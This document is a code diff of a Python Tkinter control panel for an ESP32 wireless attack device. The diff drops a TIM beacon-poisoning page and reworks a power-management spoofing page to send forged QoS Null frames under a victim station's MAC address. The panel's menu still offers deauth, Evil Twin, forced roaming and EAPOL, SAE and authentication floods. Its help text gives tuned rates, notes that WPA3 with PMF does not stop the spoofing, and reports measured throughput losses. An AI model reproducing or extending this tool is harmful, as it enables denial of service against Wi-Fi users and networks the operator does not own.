@@ -51,11 +51,10 @@ MENU = [
     ("ba", "BA 会话攻击"),
     ("evil", "Evil Twin"),
     ("btm", "BTM 强制漫游"),
-    ("tim", "TIM 投毒"),
     ("eapol", "EAPOL 洪泛"),
     ("sae", "SAE 洪泛"),
     ("authflood", "Auth 洪泛"),
-    ("pspoll", "PM 位欺骗"),
+    ("qosnull", "QoS Null PM 位欺骗"),
     ("status", "设备状态"),
     ("log", "日志"),
 ]
@@ -72,10 +71,6 @@ DEAUTH_MODES = [
 BA_STEPS = ["512", "256", "1024", "2047", "0 (对照：不推窗口)"]
 
 # 参数选项（文本里的英文前缀就是命令行 token）
-TIM_MODES = [
-    "tim - 置位：声称有缓存，客户端一直醒着来取",
-    "clear - 清空：客户端睡过真实下行",
-]
 EAPOL_TIDS = [
     "6 - QoS TID6（默认，wpa_supplicant 的 EAPOL TID）",
     "-1 - 只发非 QoS 数据帧",
@@ -92,18 +87,6 @@ AUTH_MODES = [
     "auth - 只发 Authentication",
     "assoc - 只发 Association Request",
 ]
-# PM 位可以装在三种帧里，各家协议栈认的不一样，所以做成可选项：
-#   null    = Null Data（data 4），规范里的标准省电声明帧
-#   qosnull = QoS Null（data 12），QoS/WMM 关联用的形式
-#   action  = 单播 Action（管理 13，类别 127 厂商自定义，不属于 PMF 的 robust 集合）
-# PS-Poll 那一半已删除：单播的子类型 10 帧在本 MAC 上发不出去（实测 0/10），
-# 详见 attack-principles.md 附录 A。
-PSPOLL_SHAPES = [
-    "qosnull - QoS Null（默认：实测最强，-38%）",
-    "null - Null Data（规范标准形式，实测 -30%）",
-    "action - 单播 Action（类别 127，实测 -21%）",
-]
-
 DELBA_REASONS = [
     "37 - 不再使用该机制",
     "1 - 未指定原因",
@@ -362,22 +345,19 @@ class DeautherApp:
         self.delba_label = None
         self.ba_step_var = tk.StringVar(value=BA_STEPS[0])
         self.ba_label = None
-        # 六个管理/数据帧页面共用：key -> 目标行 label
+        # 管理/数据帧页面共用：key -> 目标行 label
         self.mod_labels = {}
         self.btm_timer_var = tk.StringVar(value="10")
         self.btm_sta_var = tk.StringVar(value="")
         self.btm_cand_var = tk.StringVar(value="")
         self.btm_candch_var = tk.StringVar(value="0")
-        self.tim_mode_var = tk.StringVar(value=TIM_MODES[0])
-        self.tim_aid_var = tk.StringVar(value="0")
         self.eapol_tid_var = tk.StringVar(value=EAPOL_TIDS[0])
         self.eapol_mac_var = tk.StringVar()
         self.sae_elem_var = tk.StringVar(value=SAE_ELEMS[0])
         self.sae_gap_var = tk.StringVar(value="50")
         self.auth_mode_var = tk.StringVar(value=AUTH_MODES[0])
         self.auth_auto_var = tk.BooleanVar(value=True)
-        self.pspoll_mac_var = tk.StringVar()
-        self.pspoll_shape_var = tk.StringVar(value=PSPOLL_SHAPES[0])
+        self.qosnull_mac_var = tk.StringVar()
 
         root.title("ESP32 Wireless Attack 上位机")
         root.geometry("1040x700")
@@ -439,11 +419,10 @@ class DeautherApp:
         self.pages["ba"] = self._build_ba_page()
         self.pages["evil"] = self._build_evil_page()
         self.pages["btm"] = self._build_btm_page()
-        self.pages["tim"] = self._build_tim_page()
         self.pages["eapol"] = self._build_eapol_page()
         self.pages["sae"] = self._build_sae_page()
         self.pages["authflood"] = self._build_authflood_page()
-        self.pages["pspoll"] = self._build_pspoll_page()
+        self.pages["qosnull"] = self._build_qosnull_page()
         self.pages["status"] = self._build_status_page()
         self.pages["log"] = self._build_log_page()
 
@@ -785,44 +764,6 @@ class DeautherApp:
         ).pack(anchor="w", pady=(12, 0))
         return page
 
-    def _build_tim_page(self):
-        page = self._make_page()
-        ttk.Label(page, text="TIM 投毒（克隆 beacon 篡改省电位图）",
-                  font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
-        ttk.Label(
-            page,
-            text="克隆目标 AP 的 beacon（同 BSSID/SSID/RSN/capability/interval），只改 TIM 元素："
-                 "按 AID 置位让客户端白等，或清空让它睡过真实下行。beacon 不受 PMF 保护。",
-            foreground="#777777", wraplength=920, justify="left",
-        ).pack(anchor="w", pady=(0, 8))
-        self._target_bar(page, "tim")
-
-        params = ttk.Frame(page)
-        params.pack(fill="x", pady=(4, 6))
-        ttk.Label(params, text="模式：").pack(side="left")
-        ttk.Combobox(params, textvariable=self.tim_mode_var, values=TIM_MODES,
-                     state="readonly", width=38).pack(side="left")
-        ttk.Label(params, text="  受害 AID（0=学到的全部）：").pack(side="left")
-        ttk.Entry(params, textvariable=self.tim_aid_var, width=6).pack(side="left")
-
-        actions = ttk.Frame(page)
-        actions.pack(fill="x", pady=(6, 4))
-        ttk.Button(actions, text="开始克隆", width=14, command=self.start_tim).pack(side="left")
-        ttk.Button(actions, text="停止", width=10, command=self.tim_stop).pack(side="left", padx=8)
-
-        ttk.Label(
-            page,
-            text=("说明：\n"
-                  "• 必须先听到目标 AP 的真 beacon 才会发第一帧（否则克隆出来是个“坏网络”），"
-                  "timreal 就是这个计数；\n"
-                  "• AID 不在 beacon 里，它来自 Association Response，靠嗅探学习；学不到时按 AID 1 兜底；\n"
-                  "• 克隆 beacon 每 20 ms 一帧（真 AP 100 TU≈102 ms），是广播帧，不占单播缓存池；\n"
-                  "• TSF 投毒已删除：beacon 的时间戳字段由 MAC 用自己的 TSF 覆盖，写什么都上不了空口；\n"
-                  "• 底栏：timf 帧数、timaid 学到的 AID 位图、timreal 学到的真 beacon 数。"),
-            justify="left",
-        ).pack(anchor="w", pady=(12, 0))
-        return page
-
     def _build_eapol_page(self):
         page = self._make_page()
         ttk.Label(page, text="EAPOL-Start / Logoff 洪泛",
@@ -939,47 +880,42 @@ class DeautherApp:
         ).pack(anchor="w", pady=(12, 0))
         return page
 
-    def _build_pspoll_page(self):
+    def _build_qosnull_page(self):
         page = self._make_page()
-        ttk.Label(page, text="PS-Poll / 电源管理欺骗（伪造 PM 位与省电取帧）",
+        ttk.Label(page, text="QoS Null PM 位欺骗（冒充受害者回 AP）",
                   font=("", 12, "bold")).pack(anchor="w", pady=(10, 4))
         ttk.Label(
             page,
-            text="用受害 STA 的 MAC 伪造 PM=1 的 Null Data：AP 以为它睡着了，把下行缓存进 TIM，"
-                 "而真站醒着、永远不取，于是收不到。PM 位在数据帧的帧控制里，不属于 PMF 保护集，"
-                 "强制 PMF 的 WPA3 网络照样成立。",
+            text="用受害 STA 的 MAC 给 AP 发一个单播 QoS Null（ToDS，26 字节，无载荷）："
+                 "PM=1 是“我要睡了，下行先缓存”，PM=0 是“我醒了，把缓存的发过来”。"
+                 "PM 位在帧控制里，不属于 PMF 保护集，强制 PMF 的 WPA3 网络照样成立。",
             foreground="#777777", wraplength=920, justify="left",
         ).pack(anchor="w", pady=(0, 8))
-        self._target_bar(page, "pspoll")
+        self._target_bar(page, "qosnull")
 
         params = ttk.Frame(page)
         params.pack(fill="x", pady=(4, 6))
-        ttk.Label(params, text="帧型：").pack(side="left")
-        ttk.Combobox(params, textvariable=self.pspoll_shape_var, values=PSPOLL_SHAPES,
-                     state="readonly", width=44).pack(side="left")
-        ttk.Label(params, text="  受害 STA MAC（空=嗅探学习）：").pack(side="left")
-        ttk.Entry(params, textvariable=self.pspoll_mac_var, width=16).pack(side="left")
+        ttk.Label(params, text="受害 STA MAC（空=嗅探学习）：").pack(side="left")
+        ttk.Entry(params, textvariable=self.qosnull_mac_var, width=19).pack(side="left")
 
         actions = ttk.Frame(page)
         actions.pack(fill="x", pady=(6, 4))
-        ttk.Button(actions, text="开始欺骗", width=14, command=self.start_pspoll).pack(side="left")
+        ttk.Button(actions, text="开始欺骗", width=14, command=self.start_qosnull).pack(side="left")
         ttk.Button(actions, text="停止", width=10,
-                   command=self.pspoll_stop).pack(side="left", padx=8)
+                   command=self.qosnull_stop).pack(side="left", padx=8)
         ttk.Button(actions, text="解除（发 PM=0）", width=16,
-                   command=self.pspoll_release).pack(side="left")
+                   command=self.qosnull_release).pack(side="left")
 
         ttk.Label(
             page,
             text=("说明：\n"
-                  "• 帧型三种都带 PM 位、都不受 PMF 保护，但各家协议栈认的帧不同："
-                  "null=Null Data（默认）、qosnull=QoS Null、action=单播 Action(127)；\n"
+                  "• 只发一种帧：ToDS 单播 QoS Null，PM=1 与 PM=0 只差帧控制第二位那一 bit；\n"
+                  "• 每 6 帧插一个 PM=0：那批缓存帧就冲着不在听的站发出去，延迟变丢包；\n"
                   "• 帧是单播、要 ACK，节拍 10 帧/s：20 帧/s 时这块驱动的短缓存池会在"
                   "几百帧后打满并触发 0x101 重启（实测）；\n"
-                  "• AID/PS-Poll 那一半已删除：单播的子类型 10 帧发不出去（实测 0/10 上空气），"
-                  "详见 attack-principles.md 附录 A；\n"
-                  "• 判据：pspdl 是我们听到的、发给受害者的下行数据帧数；欺骗生效时它应当停止增长；\n"
-                  "• 边界：实活站每秒都在发 PM=0 的上行帧，会把 AP 抢回“醒着”状态，所以效果是"
-                  "下行吞吐下降（实测 -24%）、不断连；AP 也会老化/重传耗尽后丢弃缓存帧。"),
+                  "• 判据：qndl 是听到的、发给受害者的下行数据帧数，欺骗生效时它应当停止增长；\n"
+                  "• 边界：受害者自己每个上行帧都带 PM=0，会把 AP 抢回“醒着”，所以效果是"
+                  "下行吞吐下降、不断连；AP 也会老化丢掉缓存帧。"),
             justify="left",
         ).pack(anchor="w", pady=(12, 0))
         return page
@@ -1008,8 +944,8 @@ class DeautherApp:
 
     def go_back(self):
         parent = {"one": "deauth", "all": "deauth", "only": "deauth", "except": "deauth"}
-        for key in ("deauth", "probe", "csa", "delba", "ba", "evil", "btm", "tim", "eapol",
-                    "sae", "authflood", "pspoll", "status", "log"):
+        for key in ("deauth", "probe", "csa", "delba", "ba", "evil", "btm", "eapol",
+                    "sae", "authflood", "qosnull", "status", "log"):
             parent[key] = "home"
         self.show_page(parent.get(self.current_page, "home"))
 
@@ -1023,9 +959,10 @@ class DeautherApp:
         self.back_btn.config(state="normal" if key != "home" else "disabled")
         titles = dict(MENU + [("home", "主菜单")])
         titles.update({k: f"Deauth · {label}" for k, label, _n, _h in DEAUTH_MODES})
-        titles.update({"btm": "802.11v BTM Request（强制漫游）", "tim": "TIM 投毒",
+        titles.update({"btm": "802.11v BTM Request（强制漫游）",
                        "eapol": "EAPOL-Start/Logoff 洪泛", "sae": "SAE Commit 洪泛",
-                       "authflood": "Auth/Assoc 洪泛", "pspoll": "PM 位欺骗（电源管理）"})
+                       "authflood": "Auth/Assoc 洪泛",
+                       "qosnull": "QoS Null PM 位欺骗（电源管理）"})
         self.page_title.config(text=titles.get(key, key))
         self._refresh_labels()
 
@@ -1373,23 +1310,6 @@ class DeautherApp:
     def btm_stop(self):
         self._send("BTMSTOP")
 
-    def start_tim(self):
-        if not self._need_single("TIM"):
-            return
-        mode = self.tim_mode_var.get().split(" ")[0]
-        try:
-            aid = int(self.tim_aid_var.get().strip() or "0")
-        except ValueError:
-            messagebox.showerror("TIM 参数无效", "AID 必须是整数。")
-            return
-        if not 0 <= aid <= 256:
-            messagebox.showerror("TIM 参数无效", "AID 必须是 0（学到的全部）或 1..256。")
-            return
-        self._send(f"TIM {self.single_index} {mode} {aid}")
-
-    def tim_stop(self):
-        self._send("TIMSTOP")
-
     def start_eapol(self):
         if not self._need_single("EAPOL"):
             return
@@ -1437,26 +1357,24 @@ class DeautherApp:
     def authflood_stop(self):
         self._send("AUTHFLOODSTOP")
 
-    def start_pspoll(self):
+    def start_qosnull(self):
         if not self._need_single("PM 欺骗"):
             return
-        mac = self.pspoll_mac_var.get().strip().upper().replace(":", "").replace("-", "")
+        mac = self.qosnull_mac_var.get().strip().upper().replace(":", "").replace("-", "")
         if mac and (len(mac) != 12 or any(c not in "0123456789ABCDEF" for c in mac)):
             messagebox.showerror("PM 欺骗参数无效",
                                  "STA MAC 要 12 位十六进制（可带冒号），例如 02:AABB:CCDD:EE。")
             return
-        shape = self.pspoll_shape_var.get().split(" ")[0]
-        command = f"PSPOLL {self.single_index}"
+        command = f"QOSNULL {self.single_index}"
         if mac:
             command += f" {mac}"
-        command += f" {shape}"
         self._send(command)
 
-    def pspoll_stop(self):
-        self._send("PSPOLLSTOP")
+    def qosnull_stop(self):
+        self._send("QOSNULLSTOP")
 
-    def pspoll_release(self):
-        self._send("PSPOLLREL")
+    def qosnull_release(self):
+        self._send("QOSNULLREL")
 
     def stop(self):
         self._send("STOP")
@@ -1535,12 +1453,10 @@ class DeautherApp:
                 f"BTM：{payload.get('btm', '-')} ({payload.get('btmf', '-')} 帧 / "
                 f"{payload.get('btmc', '-')} 个 11v STA / 回 {payload.get('btmresp', '-')})    "
                 f"RRM：{payload.get('rrm', '-')} ({payload.get('rrmf', '-')} 帧)    "
-                f"TIM：{payload.get('tim', '-')} ({payload.get('timf', '-')} 帧 / "
-                f"aid=0x{int(payload.get('timaid', '0') or '0'):X})    "
                 f"EAPOL：{payload.get('eap', '-')} ({payload.get('eapf', '-')} 帧 / "
                 f"AP 回 {payload.get('eaprxreq', '-')})    "
-                f"PS-Poll：{payload.get('psp', '-')} ({payload.get('pspf', '-')} 帧 / "
-                f"下行 {payload.get('pspdl', '-')})    "
+                f"QoS Null：{payload.get('qn', '-')} ({payload.get('qnf', '-')} 帧 / "
+                f"下行 {payload.get('qndl', '-')})    "
                 f"SAE：{payload.get('sae', '-')} ({payload.get('saef', '-')} 帧 / "
                 f"{payload.get('saesec', '-')})    "
                 f"Auth：{payload.get('af', '-')} ({payload.get('aff', '-')} 帧)    "
@@ -1555,10 +1471,8 @@ class DeautherApp:
                         "bamode", "baaddba", "babar", "badlba", "bassn", "baerr", "baplant",
                         "btm", "btmf", "btmc", "btmskip", "btmresp", "btms",
                         "rrm", "rrmf", "rrmc", "rrmleft", "rrmreq", "rrmresp", "rrmch", "rrmtok",
-                        "tim", "timf", "timaid", "timreal",
                         "eap", "eapf", "eaprx", "eaprxreq", "eaprxsta",
-                        "psp", "pspfrm", "pspf", "pspnul", "pspfl", "pspc", "pspdl",
-                        "psprxp", "psprxn", "psprxpm",
+                        "qn", "qnf", "qn1", "qn0", "qnc", "qndl", "qnrn", "qnrp",
                         "sae", "saesec", "saef", "saec", "saeresp", "saecode", "saetok", "saeecho",
                         "af", "aff", "afa", "afs", "afids", "afst", "afup",
                         "txg", "txgok", "txgerr"):
